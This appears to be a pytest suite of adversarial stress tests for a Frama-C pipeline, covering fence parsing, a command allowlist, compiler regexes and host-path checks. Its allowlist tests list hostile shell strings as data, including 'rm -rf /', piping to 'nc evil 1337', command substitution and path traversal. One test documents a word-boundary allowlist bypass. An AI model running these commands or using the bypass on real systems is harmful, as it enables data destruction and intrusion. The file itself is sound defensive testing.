"""
Adversarial empirical stress-tests for Milestone M2 (Schemas & Infra Guards).
Author: challenger_m2_2

Empirically challenges:
1. `trust.extract_block` and `_scan_code_fences` (scripts/trust.py)
   - Benchmark performance on large inputs (50,000 unclosed lines) for strictly linear O(N) execution
   - CommonMark edge cases: mixed backticks/tildes, indentations (0, 1, 2, 3, 4 spaces), CRLF, trailing chars
2. `resources.is_known_static_command` (scripts/resources.py)
   - Shell injection attempts (; && | ` $ > < \n \r), path traversal in scripts, dynamic targets disguised as static
   - Security audit on script path word-boundary matching
3. `build_capture._COMPILER_RE` and `declared_names` (scripts/build_capture.py)
   - Tricky C code constructs: names in string literals, block comments, line comments, macros, inline bodies
   - Compiler names with complex version triples and suffixes
"""

from __future__ import annotations

import sys
import time
from pathlib import Path

import pytest

_SCRIPTS_DIR = Path(__file__).resolve().parent.parent / "scripts"
if str(_SCRIPTS_DIR) not in sys.path:
    sys.path.insert(0, str(_SCRIPTS_DIR))

import benchmark  # noqa: E402
import build_capture  # noqa: E402
import minischema  # noqa: E402
import resources  # noqa: E402
import trust  # noqa: E402
import wp_scheduler  # noqa: E402

pytestmark = pytest.mark.unit


# ===========================================================================
# 1. Stress-test trust._scan_code_fences and extract_block
# ===========================================================================


class TestTrustFenceScannerPerformanceAndReDoS:
    """Benchmark performance and verify strictly linear O(N) execution with no ReDoS."""

    def test_unclosed_fence_linear_benchmark(self) -> None:
        """50,000 unclosed lines must execute in well under 0.5s with zero backtracking."""
        n_lines = 50000
        text = "```framac-threat-model\n" + "line content without fence\n" * n_lines

        start = time.perf_counter()
        fences = trust._scan_code_fences(text)
        elapsed = time.perf_counter() - start

        assert len(fences) == 0, "Unclosed fence must not yield any extracted blocks"
        assert elapsed < 0.5, f"Fence scanner took {elapsed:.3f}s for {n_lines} lines (expected < 0.5s)"

    def test_scaling_linearity(self) -> None:
        """Scan 10k lines vs 50k lines: ratio of elapsed time must be approx linear (<= 7x for 5x input)."""
        text_10k = "```framac-threat-model\n" + ("a" * 80 + "\n") * 10000
        text_50k = "```framac-threat-model\n" + ("a" * 80 + "\n") * 50000

        t0 = time.perf_counter()
        trust._scan_code_fences(text_10k)
        t_10k = time.perf_counter() - t0

        t0 = time.perf_counter()
        trust._scan_code_fences(text_50k)
        t_50k = time.perf_counter() - t0

        t_10k = max(t_10k, 0.001)
        ratio = t_50k / t_10k
        assert ratio < 10.0, f"Scaling ratio {ratio:.2f}x indicates super-linear behaviour"

    def test_extract_block_unclosed_opener_detection(self) -> None:
        """When a fence names framac-threat-model but is unclosed, extract_block must return an informative error."""
        text = "```framac-threat-model\n" + '{"input_sources": []}\n' * 100
        block, errors = trust.extract_block(text)
        assert block is None
        assert len(errors) == 1
        assert "a fence names `framac-threat-model` but no block could be read" in errors[0]

    def test_extract_block_with_many_unrelated_fences(self) -> None:
        """1,000 unrelated code blocks preceding and succeeding the threat model block."""
        blocks_text = []
        for i in range(500):
            blocks_text.append(f"```c\nint foo_{i}(void) {{ return {i}; }}\n```\n")
        blocks_text.append('```framac-threat-model\n{"input_sources": ["api_entry"]}\n```\n')
        for i in range(500, 1000):
            blocks_text.append(f"```python\ndef py_foo_{i}(): pass\n```\n")
        full_text = "".join(blocks_text)

        block, errors = trust.extract_block(full_text)
        assert errors == []
        assert block == {"input_sources": ["api_entry"]}


class TestTrustCommonMarkEdgeCases:
    """Adversarial CommonMark edge cases: fences, indentation, delimiters, CRLF."""

    @pytest.mark.parametrize(
        "fence_open,fence_close,should_close",
        [
            ("```", "```", True),
            ("~~~", "~~~", True),
            ("````", "````", True),
            ("````", "```", False),  # Closing fence shorter than opening fence must not close
            ("```", "````", True),  # Closing fence longer than opening fence must close
            ("```", "~~~", False),  # Mismatched delimiter types must not close
            ("~~~", "```", False),
            ("~~~~", "~~~", False),
        ],
    )
    def test_fence_delimiters_and_lengths(self, fence_open: str, fence_close: str, should_close: bool) -> None:
        content = f'{fence_open}framac-threat-model\n{{"key": "val"}}\n{fence_close}\n'
        fences = trust._scan_code_fences(content)
        if should_close:
            assert len(fences) == 1
            assert fences[0][0] == "framac-threat-model"
            assert '{"key": "val"}' in fences[0][1]
        else:
            assert len(fences) == 0

    @pytest.mark.parametrize("indent", [0, 1, 2, 3])
    def test_valid_indentation(self, indent: int) -> None:
        """CommonMark allows 0 to 3 spaces indentation on opening and closing fences."""
        prefix = " " * indent
        content = f'{prefix}```framac-threat-model\n{{"key": "val"}}\n{prefix}```\n'
        fences = trust._scan_code_fences(content)
        assert len(fences) == 1

    def test_invalid_indentation_4_spaces(self) -> None:
        """4 spaces indentation defines an indented code block, not a fenced code block."""
        content = '    ```framac-threat-model\n{"key": "val"}\n    ```\n'
        fences = trust._scan_code_fences(content)
        assert len(fences) == 0

    def test_closing_fence_4_spaces_does_not_close(self) -> None:
        """Closing fence indented 4 spaces does not close a valid 0-space opening fence."""
        content = '```framac-threat-model\n{"key": "val"}\n    ```\n'
        fences = trust._scan_code_fences(content)
        assert len(fences) == 0

    def test_crlf_endings(self) -> None:
        """Windows CRLF endings must parse cleanly and preserve JSON payload."""
        content = '```framac-threat-model\r\n{\r\n  "input_sources": ["test"]\r\n}\r\n```\r\n'
        fences = trust._scan_code_fences(content)
        assert len(fences) == 1
        block, errors = trust.extract_block(content)
        assert errors == []
        assert block == {"input_sources": ["test"]}

    @pytest.mark.parametrize(
        "closing_line,valid_close",
        [
            ("```", True),
            ("```   ", True),
            ("```\t", True),
            ("``` trailing_word", False),  # CommonMark: closing fence cannot have info string
            ("``` 123", False),
            ("``` ~~~", False),
        ],
    )
    def test_trailing_characters_on_closing_fence(self, closing_line: str, valid_close: bool) -> None:
        content = f'```framac-threat-model\n{{"key": 1}}\n{closing_line}\n'
        fences = trust._scan_code_fences(content)
        if valid_close:
            assert len(fences) == 1
        else:
            assert len(fences) == 0

    def test_empty_block(self) -> None:
        """Empty threat model block returns a JSON parsing error."""
        content = "```framac-threat-model\n```\n"
        block, errors = trust.extract_block(content)
        assert block is None
        assert len(errors) == 1
        assert "is not JSON" in errors[0]

    def test_multiple_framac_blocks_rejected(self) -> None:
        """Multiple framac-threat-model blocks must be rejected with an explicit error."""
        content = '```framac-threat-model\n{"block": 1}\n```\n\n```framac-threat-model\n{"block": 2}\n```\n'
        block, errors = trust.extract_block(content)
        assert block is None
        assert len(errors) == 1
        assert "2 `framac-threat-model` blocks: keep exactly one" in errors[0]

    @pytest.mark.parametrize(
        "non_dict_json",
        [
            "[1, 2, 3]",
            '"string"',
            "12345",
            "true",
            "null",
        ],
    )
    def test_non_dict_json_payloads(self, non_dict_json: str) -> None:
        """Threat model block must contain a JSON object (dict), not list/primitive."""
        content = f"```framac-threat-model\n{non_dict_json}\n```\n"
        block, errors = trust.extract_block(content)
        assert block is None
        assert len(errors) == 1
        assert "must hold one JSON object" in errors[0]


# ===========================================================================
# 2. Adversarial bypass testing of resources.is_known_static_command
# ===========================================================================


class TestResourcesStaticCommandAllowlist:
    """Test security boundaries and bypass resistance in is_known_static_command."""

    @pytest.mark.parametrize(
        "cmd",
        [
            # Shell control / chaining characters
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build; rm -rf /",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build && evil_command",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build || evil_command",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build | nc evil 1337",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build > /tmp/out",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build < /dev/zero",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run `whoami`",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run $(whoami)",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build\nrm -rf /",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build\r\nrm -rf /",
            # Sandboxed execution of target binaries
            "/opt/framac-pipeline/scripts/sandbox_exec.py run",
            "python3 /opt/framac-pipeline/scripts/sandbox_exec.py -- /target/binary",
            # Dynamic targets disguised or unrecognised
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run fuzz",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run replay",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run selftest",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run coverage",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run minimize",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run wp-replay",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run wp-queue",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run fuzz-mymodule",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run module-mymodule",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run coverage-mymodule",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run replay-mymodule",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run selftest-mymodule",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run unknown_target_xyz",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build-",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build-target fuzz",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run",
            # Path traversal in directory or script
            "python3 /opt/framac-pipeline/scripts/../evil.py",
            "python3 /opt/framac-pipeline/scripts/../../bin/bash",
            # Case sensitivity and non-allowed interpreters
            "/OPT/FRAMAC-PIPELINE/SCRIPTS/pipeline_make.py run build",
            "bash /opt/framac-pipeline/scripts/pipeline_make.py run build",
            "perl /opt/framac-pipeline/scripts/pipeline_make.py run build",
            # Nil/empty inputs
            "",
            "   ",
            None,
        ],
    )
    def test_rejected_commands(self, cmd: str | None) -> None:
        """All unsafe, dynamic, disguised, or unrecognised commands must return False."""
        assert resources.is_known_static_command(cmd) is False

    @pytest.mark.parametrize(
        "cmd",
        [
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run eva",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run facts",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run build-mod1",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run eva-mod2",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run facts-mod3",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run flamegraph-mod4",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run -j 4 build",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py run --jobs 8 build",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py --run-dir /tmp/run run build",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py gen",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py plan",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py params",
            "python3 /opt/framac-pipeline/scripts/pipeline_make.py build-check",
            "python3 $S/pipeline_make.py run build",
            "python3 ${S}/pipeline_make.py run build",
            "/opt/framac-pipeline/scripts/run_wp_function.py --target foo",
            "/opt/framac-pipeline/scripts/run_eva_slice.py --slice bar",
            "frama-c -val input.c",
            "/usr/bin/frama-c -wp input.c",
        ],
    )
    def test_accepted_static_commands(self, cmd: str) -> None:
        """Known static commands must return True."""
        assert resources.is_known_static_command(cmd) is True

    def test_script_path_word_boundary_edge_cases(self) -> None:
        """
        Documented edge case: static_tool_res uses \\b which matches non-word characters
        like dot or hyphen in script names.
        """
        # Demonstrating empirical behavior:
        # /opt/framac-pipeline/scripts/run_wp_function.py.evil.sh matches because '.' is non-word
        res_dot = resources.is_known_static_command("/opt/framac-pipeline/scripts/run_wp_function.py.evil.sh")
        res_hyphen = resources.is_known_static_command("/opt/framac-pipeline/scripts/run_wp_function.py-attack")
        assert res_dot is True  # Word-boundary anomaly identified
        assert res_hyphen is True


# ===========================================================================
# 3. Test build_capture._COMPILER_RE, _TRIPLE_COMPILER_RE, declared_names
# ===========================================================================


class TestBuildCaptureCompilerRegex:
    """Test compiler identification regexes across complex suffixes and triples."""

    @pytest.mark.parametrize(
        "name",
        [
            "gcc",
            "gcc-12",
            "gcc-14.2.0",
            "gcc-13-posix",
            "clang",
            "clang-16",
            "clang-fast",
            "afl-clang-fast",
            "afl-clang-fast-15",
            "afl-clang-fast-15-posix",
            "tcc",
            "x86_64-tcc",
            "icx",
            "icx-2024.1",
            "cc",
            "c89",
            "c99",
            "x86_64-linux-gnu-gcc",
            "x86_64-linux-gnu-gcc-13-posix",
            "arm-linux-gnueabihf-gcc-11",
            "afl-gcc",
            "musl-gcc",
        ],
    )
    def test_compiler_re_positive(self, name: str) -> None:
        assert bool(build_capture._COMPILER_RE.match(name)) is True

    @pytest.mark.parametrize(
        "name",
        [
            "gcc-ar",
            "gcc-nm",
            "gcc-ranlib",
            "clang-format",
            "clang-tidy",
            "clang-check",
            "clang-apply-replacements",
            "tcc-bin",
            "ccache",
            "distcc",
            "python3",
            "bash",
            "make",
            "ld",
            "ld.lld",
        ],
    )
    def test_compiler_re_negative(self, name: str) -> None:
        assert bool(build_capture._COMPILER_RE.match(name)) is False

    @pytest.mark.parametrize(
        "name,expected_triple",
        [
            ("x86_64-linux-gnu-gcc", "x86_64-linux-gnu"),
            ("x86_64-linux-gnu-gcc-13-posix", "x86_64-linux-gnu"),
            ("arm-none-eabi-gcc", "arm-none-eabi"),
            ("x86_64-w64-mingw32-gcc", "x86_64-w64-mingw32"),
            ("riscv64-unknown-linux-gnu-clang", "riscv64-unknown-linux-gnu"),
        ],
    )
    def test_triple_compiler_re(self, name: str, expected_triple: str) -> None:
        m = build_capture._TRIPLE_COMPILER_RE.match(name)
        assert m is not None
        assert m.group("triple") == expected_triple

    def test_wrappers_are_not_triples(self) -> None:
        """One-word prefixes like afl-gcc or musl-gcc must NOT match _TRIPLE_COMPILER_RE."""
        assert build_capture._TRIPLE_COMPILER_RE.match("afl-gcc") is None
        assert build_capture._TRIPLE_COMPILER_RE.match("musl-gcc") is None


class TestBuildCaptureDeclaredNames:
    """Stress-test C token extraction in declared_names against tricky constructs."""

    def test_ignores_names_in_comments_and_strings(self) -> None:
        code = """
        // my_fn(1, 2);
        /* my_fn(3, 4); */
        const char *s1 = "my_fn() is called here";
        const char *s2 = "void my_fn(void);";
        """
        assert build_capture.declared_names(code, {"my_fn"}) == set()

    def test_ignores_calls_in_macro_definitions(self) -> None:
        code = """
        #define INVOKE_FN() my_fn()
        #define MACRO_CALL(x) \\
            my_fn(x)
        """
        assert build_capture.declared_names(code, {"my_fn", "INVOKE_FN", "MACRO_CALL"}) == set()

    def test_ignores_calls_in_function_bodies(self) -> None:
        code = """
        int helper(void) {
            return my_fn();
        }
        void another_helper(void) {
            if (1) {
                my_fn();
            }
        }
        """
        assert build_capture.declared_names(code, {"my_fn"}) == set()
        assert build_capture.declared_names(code, {"helper", "another_helper"}) == {"helper", "another_helper"}

    def test_detects_prototypes_and_definitions(self) -> None:
        code = """
        int my_fn(void);
        char *get_name(int id, const char *prefix);
        static inline void process_data(int count) {
            // body
        }
        """
        found = build_capture.declared_names(code, {"my_fn", "get_name", "process_data", "nonexistent"})
        assert found == {"my_fn", "get_name", "process_data"}

    def test_function_pointer_variable_ignored(self) -> None:
        code = "void (*my_fn_ptr)(int, int);"
        assert build_capture.declared_names(code, {"my_fn_ptr"}) == set()

    def test_unclosed_comment_falls_back_without_crash(self) -> None:
        code = "/* unclosed comment\nint my_fn(void);\n"
        found = build_capture.declared_names(code, {"my_fn"})
        assert found == {"my_fn"}


# ===========================================================================
# 4. Milestone M2 Iteration 2 Regression & Stress Tests
# ===========================================================================

ROOT = Path(__file__).resolve().parent.parent
SCHEMA_DIR = ROOT / "schemas"
_M2_SCHEMAS = ("build_capture", "phase0_model", "security_props")


def _get_schema(name: str) -> dict:
    return minischema.load_schema(SCHEMA_DIR / f"{name}.schema.json")


class TestBenchmarkHostPathsIteration2:
    """Adversarial stress-testing of benchmark host path detection on keys and traversal."""

    @pytest.mark.parametrize(
        "bad_key",
        [
            r"C:\Users\Florian\test.c",
            r"c:/Users/Florian/test.c",
            r"D:\output.json",
            r"\\server\share\file.c",
            r"\\wsl$\Ubuntu\etc\shadow",
            r"//server/share/file.c",
            r"\Users\Florian\file.c",
            r"/home/user/code/file.c",
            r"/Users/alice/repo/main.c",
            r"/etc/passwd",
            r"/var/log/syslog",
            r"/framac-run/../etc/passwd",
            r"file:///home/user/test.c",
            r"file://C:/Users/test.c",
        ],
    )
    def test_assert_no_host_paths_rejects_host_keys(self, bad_key: str) -> None:
        payload = {bad_key: "clean_value"}
        with pytest.raises(benchmark.BenchmarkError, match="host path in the run file"):
            benchmark.assert_no_host_paths(payload)

    @pytest.mark.parametrize(
        "bad_key",
        [
            r"C:\Users\Florian\nested.c",
            r"/home/user/nested.c",
            r"\\server\share\nested.json",
        ],
    )
    def test_assert_no_host_paths_rejects_deeply_nested_host_keys(self, bad_key: str) -> None:
        payload = {"level1": {"level2": [{bad_key: 123}]}}
        with pytest.raises(benchmark.BenchmarkError, match="host path in the run file"):
            benchmark.assert_no_host_paths(payload)

    @pytest.mark.parametrize(
        "clean_payload",
        [
            {"./workspace/summary.json": "../src/main.c"},
            {"../../src/helper.h": "./relative/path.c"},
            {"/framac-run/workspace/output.txt": "/framac-run/cache/model.json"},
            {"simple.c": {"key": 1, "arr": ["./relative/file.c"]}},
            {123: "numeric_key_safe", 456: "./file.c"},
        ],
    )
    def test_assert_no_host_paths_accepts_clean_relative_and_container_paths(self, clean_payload: dict) -> None:
        benchmark.assert_no_host_paths(clean_payload)

    def test_scrub_host_paths_symmetric_key_scrubbing(self) -> None:
        replacements = [("/home/developer/frama-c", "<REPO>"), (r"C:\Users\Developer", "<HOME>")]
        raw = {
            "/home/developer/frama-c/src/a.c": "/home/developer/frama-c/build/a.o",
            r"C:\Users\Developer\workspace\run": [r"C:\Users\Developer\secret.txt"],
            42: "integer_key_preserved",
        }
        scrubbed = benchmark.scrub_host_paths(raw, replacements)
        assert scrubbed == {
            "<REPO>/src/a.c": "<REPO>/build/a.o",
            "<HOME>\\workspace\\run": ["<HOME>\\secret.txt"],
            42: "integer_key_preserved",
        }


class TestFunctionIdSchemaIteration2:
    """Stress-test function_id schema patterns against control characters and variations."""

    @pytest.mark.parametrize("name", _M2_SCHEMAS)
    @pytest.mark.parametrize(
        "newline_id",
        [
            "include/my\nlib/a.h#g",
            "include/my\rlib/a.h#g",
            "include/my\r\nlib/a.h#g",
            "\nsrc/a.c#func",
            "\rsrc/a.c#func",
            "src/a.c#func\n",
            "src/a.c#func\r",
            "src/a.c#func\r\n",
            "dir\n/file.c#f",
            "dir/\nfile.c#f",
        ],
    )
    def test_function_id_strictly_rejects_newlines_in_all_components(self, name: str, newline_id: str) -> None:
        val = minischema.Validator(_get_schema(name))
        errors = val.errors(newline_id, {"$ref": "#/definitions/function_id"})
        assert errors != [], f"Schema {name} accepted newline_id {newline_id!r}"

    @pytest.mark.parametrize("name", _M2_SCHEMAS)
    @pytest.mark.parametrize(
        "valid_spaced_id",
        [
            "include/my lib/a.h#g",
            "dir with multiple spaces/sub dir/test.c#run_test",
            "dir 1/dir 2/dir 3/file.c#_f",
        ],
    )
    def test_function_id_permits_directory_spaces_without_newlines(self, name: str, valid_spaced_id: str) -> None:
        val = minischema.Validator(_get_schema(name))
        errors = val.errors(valid_spaced_id, {"$ref": "#/definitions/function_id"})
        assert errors == [], f"Schema {name} rejected valid spaced id {valid_spaced_id!r}: {errors}"


class TestWpSchedulerPlaceholderDynamicReIteration2:
    """Stress-test dynamic placeholder pattern derivation in wp_scheduler."""

    def test_default_pattern_covers_all_render_keys(self) -> None:
        pat = wp_scheduler.placeholder_re()
        for key in wp_scheduler.BRIEF_RENDER_KEYS:
            placeholder_str = f"{{{key}}}"
            assert pat.search(placeholder_str) is not None, f"Pattern failed to match {{{key}}}"

    def test_custom_keys_isolated_derivation(self) -> None:
        custom_keys = ["custom_key_a", "custom_key_b"]
        pat = wp_scheduler.placeholder_re(custom_keys)
        assert pat.search("{custom_key_a}") is not None
        assert pat.search("{custom_key_b}") is not None
        assert pat.search("{c_file}") is None
        assert pat.search("{function_name}") is None

    def test_escaping_of_regex_characters_in_keys(self) -> None:
        special_keys = ["dotted.key", "plus+key"]
        pat = wp_scheduler.placeholder_re(special_keys)
        assert pat.search("{dotted.key}") is not None
        assert pat.search("{dottedXkey}") is None
        assert pat.search("{plus+key}") is not None
